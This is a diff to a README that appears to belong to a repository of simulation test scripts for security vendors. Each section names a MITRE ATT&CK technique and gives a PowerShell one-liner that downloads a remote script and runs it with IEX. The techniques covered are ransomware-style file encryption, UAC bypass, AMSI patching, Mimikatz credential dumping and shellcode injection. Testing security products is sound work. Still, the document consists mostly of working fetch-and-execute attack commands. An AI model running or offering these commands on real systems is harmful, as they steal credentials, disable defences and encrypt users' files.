@@ -16,9 +16,11 @@ Adversaries may encrypt data on target systems or on large numbers of systems in
 https://attack.mitre.org/techniques/T1486/
 
 ### Encryption  
+
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-RansomSIM.ps1"); Invoke-RansomSIM -Mode Encrypt -Path 'C:\Users\tester\Documents\Test';`
 
 ### Decryption  
+
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-RansomSIM.ps1"); Invoke-RansomSIM -Mode Decrypt -Path 'C:\Users\tester\Documents\Test';`
 
 ## User Account Control Bypass (UAC) 
@@ -26,9 +28,11 @@ Adversaries may bypass UAC mechanisms to elevate process privileges on system. W
 https://attack.mitre.org/techniques/T1548/002/
 
 ### 1. FodHelper
+
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-UAC1.ps1"); Invoke-FodHelper;`
 
 ### 2. ComputerDefaults
+
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-UAC2.ps1"); Invoke-ComputerDefaults;`
 
 ## Antimalware Scan Interface (AMSI) 
@@ -37,6 +41,7 @@ Patching Antimalware Scan Interface (AMSI) becomes part of almost every attack w
 https://attack.mitre.org/techniques/T1562/001/
 
 ### 1. AmsiScanBuffer
+
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-AMSI1.ps1"); Invoke-AmsiBypass1;`
 
 ## Credentials Theft
@@ -44,9 +49,11 @@ Adversaries may search for common password storage locations to obtain user cred
 https://attack.mitre.org/techniques/T1555/
 
 ### 1. Lsass logon passwords
+
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds;`
 
 ### 2. Browser Vault credential theft
+
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "vault::list";`
 
 ## Injection
@@ -58,4 +65,5 @@ Shellcode injection and execution is one of the most popular living-off-the-land
 
 #### 1. Entry Injection
 Injection of shellcode into the entry of a legitimate spawn process
+
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ShellcodeInjection1.ps1"); Invoke-Shellcode1;`
